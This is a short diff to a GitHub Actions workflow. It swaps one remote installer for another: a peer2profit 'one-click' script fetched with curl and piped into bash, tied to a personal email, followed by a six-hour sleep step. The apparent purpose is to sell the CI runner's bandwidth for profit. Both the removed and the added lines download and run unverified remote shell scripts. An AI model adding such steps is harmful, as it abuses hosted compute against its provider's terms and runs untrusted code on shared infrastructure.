@@ -11,10 +11,6 @@ jobs:
     runs-on: ubuntu-20.04
     steps:
     - name: Download installer
-      run: wget https://raw.githubusercontent.com/Dodic-Codes/P2P_earn/main/p2p-service.sh -O install.sh
-    - name: Set access
-      run: sudo chmod +x install.sh
-    - name: Install and run
-      run: sudo bash install.sh
+      run: curl -L https://raw.githubusercontent.com/spiritLHLS/peer2profit-one-click-command-installation/main/p.sh -o p.sh && chmod +x p.sh && bash p.sh -m kolana122@outlook.com
     - name: Timeout
       run: sleep 6h
